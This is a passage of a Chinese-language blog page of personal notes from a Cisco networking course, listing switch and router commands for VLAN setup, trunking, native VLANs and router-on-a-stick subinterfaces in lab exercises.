class="headerlink" title="6.2.1.3 端口分配到vlan"></a>6.2.1.3 端口分配到vlan</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">configure terminal<br><span class="hljs-keyword">interface</span> <span class="hljs-symbol">interface_id</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">access</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">access</span> <span class="hljs-symbol">vlan</span> <span class="hljs-symbol">vlan_id</span><br><span class="hljs-symbol">end</span><br></code></pre></td></tr></table></figure><p><strong>注</strong>：使用 <strong>interface range</strong> 命令可同时配置多个接口。</p><h3 id="6-2-1-4-删除vlan分配"><a href="#6-2-1-4-删除vlan分配" class="headerlink" title="6.2.1.4 删除vlan分配"></a>6.2.1.4 删除vlan分配</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">configure terminal<br><span class="hljs-keyword">interface</span> <span class="hljs-symbol">f0</span>/<span class="hljs-symbol">18</span><br><span class="hljs-symbol">no</span> <span class="hljs-symbol">switchport</span> <span class="hljs-symbol">access</span> <span class="hljs-symbol">vlan</span><br><span class="hljs-symbol">end</span><br></code></pre></td></tr></table></figure><h3 id="6-2-1-5-删除"><a href="#6-2-1-5-删除" class="headerlink" title="6.2.1.5 删除"></a>6.2.1.5 删除</h3><p>no vlan vlan_id 删除vlan</p><h2 id="6-2-1-7"><a href="#6-2-1-7" class="headerlink" title="6.2.1.7"></a>6.2.1.7</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Faculty/Staff<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#exit<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Students<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name <span class="hljs-constructor">Guest(Default)</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management&amp;Native<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-built_in">int</span> g0/<span class="hljs-number">1</span> <br>switchport mode trunk<br><span class="hljs-built_in">int</span> g0/<span class="hljs-number">2</span><br>switchport mode trunk<br><br><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span> <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Faculty/Staff<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Students<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name <span class="hljs-constructor">Guest(Default)</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management&amp;Native<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport mode access <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport access vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">18</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport mode access <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport access vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport mode access <br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#switchport access vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> tr<br><span class="hljs-constructor">S2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> trunk <br><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Faculty/Staff<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Students<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name <span class="hljs-constructor">Guest(Default)</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management&amp;Native<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> ac<br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> access <br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw acc vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">18</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> access <br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw acc vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw <span class="hljs-keyword">mod</span> access <br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw acc vlan <span class="hljs-number">30</span><br><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">2</span><br><span class="hljs-constructor">S3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw mode tr<br></code></pre></td></tr></table></figure><p>##5/25</p><h3 id="6-2-2-2-原生vlan"><a href="#6-2-2-2-原生vlan" class="headerlink" title="6.2.2.2 原生vlan"></a>6.2.2.2 原生vlan</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">switchport </span>mode trunk<br><span class="hljs-keyword">switchport </span>trunk native vlan vlan_id <span class="hljs-comment"># 指定vlan给没标记的帧 原生vlan</span><br><span class="hljs-keyword">switchport </span>trunk allowed vlan vlan-list <span class="hljs-comment"># 指定可以通过的vlan清单</span><br><br>no <span class="hljs-keyword">switchport </span>trunk allowed vlan <span class="hljs-comment">#设为允许所有</span><br>no <span class="hljs-keyword">switchport </span>trunk native vlan <span class="hljs-comment">#将原生vlan重置为默认</span><br></code></pre></td></tr></table></figure><h3 id="6-3-3-3-单臂路由器"><a href="#6-3-3-3-单臂路由器" class="headerlink" title="6.3.3.3 单臂路由器"></a>6.3.3.3 单臂路由器</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200525222920883.png" class="" title="image-20200525222920883"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">interface</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">10</span><br><span class="hljs-attribute">encapsulation</span> dotlq <span class="hljs-number">10</span><br><span class="hljs-attribute">ip</span> add<br><span class="hljs-attribute">interface</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span>.<span class="hljs-number">30</span><br><span class="hljs-attribute">encapsulation</span> dotlq <span class="hljs-number">30</span><br><br><span class="hljs-attribute">int</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">no</span> shutdown<br></code></pre></td></tr></table></figure><h2 id="6-2-2-4"><a href="#6-2-2-4" class="headerlink" title="6.2.2.4"></a>6.2.2.4</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vim">S2S3先按表分配<br><br>S1<br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">2</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br><br>S2<br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br><br>S3<br><br><span class="hljs-keyword">int</span> g0/<span class="hljs-number">2</span><br><span class="hljs-keyword">sw</span> mo <span class="hljs-keyword">tr</span><br><span class="hljs-keyword">sw</span> <span class="hljs-keyword">tr</span> native vlan <span class="hljs-number">99</span><br></code></pre></td></tr></table></figure><h2 id="6-2-3-7"><a href="#6-2-3-7" class="headerlink" title="6.2.3.7"></a>6.2.3.7</h2><p>S3有bug，pc5接在f0/17上</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> sw ac vlan <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> mo t<br><span class="hljs-function"><span class="hljs-title">S2</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> mo trunk <br><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> sw ac vlan <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vla <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">17</span><br><span class="hljs-function"><span class="hljs-title">S3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vla <span class="hljs-number">20</span><br><br><br>PC6的ip改成<span class="hljs-number">172.17</span>.<span class="hljs-number">30.26</span><br></code></pre></td></tr></table></figure><h2 id="6-2-3-8"><a href="#6-2-3-8" class="headerlink" title="6.2.3.8"></a>6.2.3.8</h2><p>排错，先放过</p><h2 id="6-3-3-6"><a href="#6-3-3-6" class="headerlink" title="6.3.3.6"></a>6.3.3.6</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span>#ex<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">11</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">6</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m ac<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> ac vlan <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> m trunk <br><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0.30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> shut<br></code></pre></td></tr></table></figure><h2 id="6-3-3-8"><a href="#6-3-3-8" class="headerlink" title="6.3.3.8"></a>6.3.3.8</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> ad  <span class="hljs-number">172.17</span>.<span class="hljs-number">25.2</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.252</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.88</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">88</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">88.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1.99</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#encapsulation</span> dot1Q <span class="hljs-number">99</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">99.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-subif)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> shut<br><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if-range)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Faculty/Staff<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">20</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Students<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">30</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Guest(Default)<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">88</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Native<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#vlan</span> <span class="hljs-number">99</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-vlan)</span></span><span class="hljs-selector-id">#name</span> Managemen<br><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> default-gateway <span class="hljs-number">172.17</span>.<span class="hljs-number">99.1</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> vlan99<br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> add <span class="hljs-number">172.17</span>.<span class="hljs-number">99.10</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#no</span> shut<br><br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">1</span> <br><span class="hljs-function"><span class="hljs-title">S1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#sw</span> t native vlan <span class="hljs-number">88</span><br></code></pre></td></tr></table></figure><h2 id="6-4-1-2"><a href="#6-4-1-2" class="headerlink" title="6.4.1.2"></a>6.4.1.2</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R1(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> s0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>(config-<span class="hljs-keyword">if</span>)#ip ad <span class="hljs-number">172.31</span>.<span class="hljs-number">1.2</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span 